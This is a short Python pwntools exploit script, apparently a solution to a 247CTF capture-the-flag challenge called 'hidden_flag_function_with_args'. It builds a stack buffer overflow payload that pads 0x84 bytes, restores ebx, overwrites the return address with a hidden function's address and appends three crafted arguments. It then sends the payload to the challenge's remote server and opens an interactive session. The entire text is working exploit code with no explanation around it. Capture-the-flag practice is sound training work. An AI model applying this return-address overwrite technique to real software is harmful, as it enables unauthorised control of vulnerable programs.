from pwn import *

flag_address = 0x08048576
ebx_original_value = 0x0804a000
arg1 = 0x1337
arg2 = 0x247
arg3 = 0x12345678
payload = b"A"*0x84 + p32(ebx_original_value) + b"B"*0x4 + p32(flag_address) + b"C"*0x4 + p32(arg1) + p32(arg2) + p32(arg3)

binary = process("./hidden_flag_function_with_args")
binary = remote("638843e8c543438a.247ctf.com", 50425)
print(binary.recv())
binary.sendline(payload)
binary.interactive()
